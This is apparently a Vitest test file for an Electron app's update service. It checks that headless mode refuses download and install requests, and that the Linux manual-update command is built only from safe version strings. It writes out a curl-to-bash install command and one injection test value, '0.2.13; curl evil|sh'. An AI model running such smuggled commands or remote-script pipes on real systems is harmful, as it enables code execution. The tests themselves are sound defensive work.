/**
 * `services/updateService.ts` + `ipc/updateHandlers.ts` —— 无头运行时只检查不安装（docs/headless/design.md）：
 * `available` 带 `manual`（Linux 上是重跑安装脚本的命令，别的平台 null；命令只由 `x.y.z[-pre]` 拼出），
 * `update:download` / `update:install` 以 `code: 'headless'` 拒绝，退出时也不顺手装；桌面模式照旧。
 *
 * electron-updater 是手搓的发射器替身（字段每条用例重置成哨兵值），通道注册表用真的（定义经 `listDefinitions`
 * 取出、按网络 / IPC 的上下文调用），广播经挂在注册表上的一条假传输记进 spy。每条用例 `vi.resetModules()` 后重新导入
 * （模式开关、更新服务、注册表都是模块级状态）；无头用例先在新导入的 headless 模块上 `enableHeadlessMode()`，
 * 再导入服务。平台经 `process.platform` 打桩（`headlessUpdateCommand` 缺省读它）。
 *
 *   US-E1 桌面（平台 linux）：update-available → 恰是 {type:'available', version, releaseDate, releaseNotes}，没有 manual 键
 *   US-E2 无头 linux：同上 + manual {command: 那条命令}；getLastEvent() 就是它
 *   US-E3 无头 darwin / win32：manual 恰是 {command: null}
 *   US-E4 无头 linux、版本号带 shell 字符：版本号原样转出，manual {command: null}，没有哪个字段含 curl 命令
 *   US-E5 无头 update-not-available → {type:'up-to-date', version}，与桌面一样
 *   US-Q1 无头 init：autoInstallOnAppQuit false、autoDownload false
 *   US-Q2 桌面 init：autoInstallOnAppQuit true、autoDownload false
 *   US-H1 无头 update:download（网络上下文）→ 拒绝 {code:'headless', message}；downloadUpdate 不调；不广播 error；
 *         之前的 available 仍是 lastEvent
 *   US-H2 无头 update:install：调用不同步抛，回 Promise 并以 code headless 拒绝；quitAndInstall 不调；IPC 上下文同样
 *   US-H3 无头 update:check → {success:true}，checkForUpdates 调了
 *   US-H4 桌面 download / install → {success:true}；quitAndInstall 恰以 (false, true) 调一次
 *   US-H5 桌面 download 失败 → 仍回 {success:true}，广播 {type:'error', message}
 *   US-N1 无头经真的网络分发器：update:install / update:download → {t:'result', id, ok:false, error:{message, code:'headless'}}；
 *         update:check → ok:true、value {success:true}
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { ChannelDefinition, ClientContext } from '../../ipc/registry'
import type { UpdateEvent } from '../../types'
/* eslint-disable boundaries/dependencies -- 网络那一半：真的网络分发器 + 测试夹具（产品里是 frontend 引注册表，不是服务引 frontend） */
import { createNetworkDispatcher } from '../../frontend/network/dispatch'
import { netCtx, winCtx } from '../../frontend/network/__tests__/support/fakeNetworkConnection'
/* eslint-enable boundaries/dependencies */

const SENTINEL = Symbol('unset')

type Listener = (...args: unknown[]) => void

interface FakeUpdater {
  logger: unknown
  autoDownload: unknown
  autoInstallOnAppQuit: unknown
  forceDevUpdateConfig: unknown
  on: ReturnType<typeof vi.fn>
  emit(event: string, ...args: unknown[]): void
  checkForUpdates: ReturnType<typeof vi.fn>
  downloadUpdate: ReturnType<typeof vi.fn>
  quitAndInstall: ReturnType<typeof vi.fn>
}

const state = vi.hoisted(() => ({
  updater: null as unknown
}))

vi.mock('electron', () => ({ app: { isPackaged: true } }))
vi.mock('electron-updater', () => ({
  get autoUpdater() {
    return state.updater
  }
}))
vi.mock('../../logger', () => ({
  createLogger: () => ({ info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() })
}))

function makeUpdater(): FakeUpdater {
  const listeners = new Map<string, Listener[]>()
  const updater: FakeUpdater = {
    logger: SENTINEL,
    autoDownload: SENTINEL,
    autoInstallOnAppQuit: SENTINEL,
    forceDevUpdateConfig: SENTINEL,
    on: vi.fn((event: string, listener: Listener) => {
      listeners.set(event, [...(listeners.get(event) ?? []), listener])
      return updater
    }),
    emit(event, ...args) {
      for (const listener of listeners.get(event) ?? []) listener(...args)
    },
    checkForUpdates: vi.fn(async () => null),
    downloadUpdate: vi.fn(async () => []),
    quitAndInstall: vi.fn()
  }
  return updater
}

const HEADLESS_MESSAGE =
  'ShuviX is running headless and does not install updates itself. Update it on the computer running it (on Linux: rerun install-linux.sh).'
const CMD = (tag: string): string =>
  'curl -fsSL https://github.com/wangdongdongc/ShuviX/releases/download/' +
  tag +
  '/install-linux.sh | bash -s -- --version ' +
  tag
const AVAILABLE_INFO = {
  version: '0.2.13',
  releaseDate: '2026-10-14T00:00:00.000Z',
  releaseNotes: 'notes'
}

let updater: FakeUpdater
let broadcast: ReturnType<typeof vi.fn<(channel: string, ...payload: unknown[]) => void>>
let updateService: { getLastEvent(): UpdateEvent | null }
let listDefinitions: () => readonly ChannelDefinition[]

const platformDescriptor = Object.getOwnPropertyDescriptor(process, 'platform')!
const setPlatform = (value: NodeJS.Platform): void => {
  Object.defineProperty(process, 'platform', { ...platformDescriptor, value })
}

/** 按模式导入一套新的模块：假传输（记广播）→ headless 开关 → 服务 init → 注册更新处理器 */
async function boot(mode: 'desktop' | 'headless'): Promise<void> {
  const registry = await import('../../ipc/registry')
  registry.attachTransport({
    name: 'test',
    serve: () => {},
    owns: () => false,
    pushTo: () => {},
    isClientAlive: () => false,
    onClientGone: () => () => {},
    broadcast: (channel, payload) => broadcast(channel, ...payload)
  })
  listDefinitions = registry.listDefinitions
  const headless = await import('../../utils/headless')
  if (mode === 'headless') headless.enableHeadlessMode()
  const service = await import('../updateService')
  service.updateService.init()
  updateService = service.updateService
  // eslint-disable-next-line boundaries/dependencies -- 服务与它的 IPC 处理器在一个用例里接起来（产品里是 ipc 引服务，不是反过来）
  const handlers = await import('../../ipc/updateHandlers')
  handlers.registerUpdateHandlers()
}

function handlerOf(channel: string): (ctx: ClientContext, ...args: unknown[]) => unknown {
  const definition = listDefinitions().find((d) => d.channel === channel)
  if (definition === undefined || definition.kind !== 'handle') {
    throw new Error(`no handle definition for ${channel}`)
  }
  return definition.fn
}

/** 只取 update:event 的广播负载 */
const updateEvents = (): unknown[] =>
  broadcast.mock.calls.filter((call) => call[0] === 'update:event').map((call) => call[1])

beforeEach(() => {
  vi.resetModules()
  updater = makeUpdater()
  state.updater = updater
  broadcast = vi.fn<(channel: string, ...payload: unknown[]) => void>()
})

afterEach(() => {
  Object.defineProperty(process, 'platform', platformDescriptor)
})

describe('US-E update-available / update-not-available 的广播', () => {
  it('US-E1 桌面（linux）：恰是四个字段，没有 manual 键', async () => {
    setPlatform('linux')
    await boot('desktop')
    updater.emit('update-available', AVAILABLE_INFO)
    expect(broadcast).toHaveBeenCalledTimes(1)
    expect(broadcast.mock.calls[0]).toStrictEqual([
      'update:event',
      {
        type: 'available',
        version: '0.2.13',
        releaseDate: '2026-10-14T00:00:00.000Z',
        releaseNotes: 'notes'
      }
    ])
    expect('manual' in (broadcast.mock.calls[0][1] as object)).toBe(false)
  })

  it('US-E2 无头 linux：带 manual {command}；getLastEvent() 就是它', async () => {
    setPlatform('linux')
    await boot('headless')
    updater.emit('update-available', AVAILABLE_INFO)
    const expected = {
      type: 'available',
      version: '0.2.13',
      releaseDate: '2026-10-14T00:00:00.000Z',
      releaseNotes: 'notes',
      manual: { command: CMD('v0.2.13') }
    }
    expect(broadcast).toHaveBeenCalledTimes(1)
    expect(broadcast.mock.calls[0]).toStrictEqual(['update:event', expected])
    expect(updateService.getLastEvent()).toStrictEqual(expected)
  })

  it.each([['darwin'], ['win32']] as const)(
    'US-E3 无头 %s：manual 恰是 {command: null}',
    async (platform) => {
      setPlatform(platform)
      await boot('headless')
      updater.emit('update-available', { ...AVAILABLE_INFO, releaseNotes: [{ note: 'x' }] })
      expect(updateEvents()).toStrictEqual([
        {
          type: 'available',
          version: '0.2.13',
          releaseDate: '2026-10-14T00:00:00.000Z',
          releaseNotes: null,
          manual: { command: null }
        }
      ])
    }
  )

  it('US-E4 无头 linux、版本号带 shell 字符：原样转出，manual {command: null}，不出现 curl 命令', async () => {
    setPlatform('linux')
    await boot('headless')
    const version = '0.2.13; curl evil|sh'
    updater.emit('update-available', { ...AVAILABLE_INFO, version })
    const events = updateEvents()
    expect(events.length).toBe(1)
    const event = events[0] as Extract<UpdateEvent, { type: 'available' }>
    expect(event.version).toBe(version)
    expect(event.manual).toStrictEqual({ command: null })
    expect(JSON.stringify(event)).not.toContain('curl -fsSL')
  })

  it('US-E5 无头 update-not-available → {type:up-to-date, version}', async () => {
    setPlatform('linux')
    await boot('headless')
    updater.emit('update-not-available', { version: '0.2.12' })
    expect(updateEvents()).toStrictEqual([{ type: 'up-to-date', version: '0.2.12' }])
    expect(updateService.getLastEvent()).toStrictEqual({ type: 'up-to-date', version: '0.2.12' })
  })
})

describe('US-Q init 时 electron-updater 的开关', () => {
  it('US-Q1 无头：退出时不安装，不自动下载', async () => {
    await boot('headless')
    expect(updater.autoInstallOnAppQuit).toBe(false)
    expect(updater.autoDownload).toBe(false)
  })

  it('US-Q2 桌面：退出时安装，不自动下载', async () => {
    await boot('desktop')
    expect(updater.autoInstallOnAppQuit).toBe(true)
    expect(updater.autoDownload).toBe(false)
  })
})

describe('US-H 更新通道的处理函数', () => {
  it('US-H1 无头 update:download（网络上下文）→ 以 code headless 拒绝；不下载、不广播 error、lastEvent 不变', async () => {
    setPlatform('linux')
    await boot('headless')
    updater.emit('update-available', AVAILABLE_INFO)
    const before = updateService.getLastEvent()
    expect(before?.type).toBe('available')
    const callsBefore = broadcast.mock.calls.length

    const pending = handlerOf('update:download')(netCtx(1))
    expect(pending).toBeInstanceOf(Promise)
    await expect(pending).rejects.toMatchObject({ code: 'headless', message: HEADLESS_MESSAGE })
    expect(updater.downloadUpdate).not.toHaveBeenCalled()
    expect(broadcast.mock.calls.length).toBe(callsBefore)
    expect(updateEvents().some((e) => (e as UpdateEvent).type === 'error')).toBe(false)
    expect(updateService.getLastEvent()).toBe(before)
  })

  it.each([
    ['network', netCtx(1)],
    ['ipc', winCtx()]
  ] as const)(
    'US-H2 无头 update:install（%s）：不同步抛，回 Promise 并以 code headless 拒绝；不调 quitAndInstall',
    async (_label, ctx) => {
      await boot('headless')
      const handler = handlerOf('update:install')
      let pending: unknown
      expect(() => {
        pending = handler(ctx)
      }).not.toThrow()
      expect(pending).toBeInstanceOf(Promise)
      await expect(pending).rejects.toMatchObject({ code: 'headless', message: HEADLESS_MESSAGE })
      expect(updater.quitAndInstall).not.toHaveBeenCalled()
      expect(broadcast).not.toHaveBeenCalled()
    }
  )

  it('US-H3 无头 update:check → {success:true}，checkForUpdates 调了', async () => {
    await boot('headless')
    await expect(handlerOf('update:check')(netCtx(1))).resolves.toStrictEqual({ success: true })
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(1)
  })

  it('US-H4 桌面 download / install → {success:true}；quitAndInstall 恰以 (false, true) 调一次', async () => {
    await boot('desktop')
    await expect(handlerOf('update:download')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(updater.downloadUpdate).toHaveBeenCalledTimes(1)
    await expect(handlerOf('update:install')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(updater.quitAndInstall).toHaveBeenCalledTimes(1)
    expect(updater.quitAndInstall.mock.calls[0]).toStrictEqual([false, true])
  })

  it('US-H5 桌面 download 失败 → 仍回 {success:true}，广播 error', async () => {
    await boot('desktop')
    updater.downloadUpdate.mockRejectedValueOnce(new Error('boom'))
    await expect(handlerOf('update:download')(winCtx())).resolves.toStrictEqual({ success: true })
    expect(broadcast.mock.calls).toStrictEqual([
      ['update:event', { type: 'error', message: 'boom' }]
    ])
    expect(updateService.getLastEvent()).toStrictEqual({ type: 'error', message: 'boom' })
  })
})

describe('US-N 经真的网络分发器', () => {
  it('US-N1 无头：install / download → ok:false + code headless；check → ok:true', async () => {
    await boot('headless')
    const dispatcher = createNetworkDispatcher({
      definitionOf: (channel) => listDefinitions().find((d) => d.channel === channel)
    })
    const ctx = netCtx(1)
    await expect(
      dispatcher.invoke(ctx, { t: 'invoke', id: 1, channel: 'update:install', args: [] })
    ).resolves.toStrictEqual({
      t: 'result',
      id: 1,
      ok: false,
      error: { message: HEADLESS_MESSAGE, code: 'headless' }
    })
    await expect(
      dispatcher.invoke(ctx, { t: 'invoke', id: 2, channel: 'update:download', args: [] })
    ).resolves.toStrictEqual({
      t: 'result',
      id: 2,
      ok: false,
      error: { message: HEADLESS_MESSAGE, code: 'headless' }
    })
    await expect(
      dispatcher.invoke(ctx, { t: 'invoke', id: 3, channel: 'update:check', args: [] })
    ).resolves.toStrictEqual({ t: 'result', id: 3, ok: true, value: { success: true } })
    expect(updater.quitAndInstall).not.toHaveBeenCalled()
    expect(updater.downloadUpdate).not.toHaveBeenCalled()
    expect(updater.checkForUpdates).toHaveBeenCalledTimes(1)
  })
})
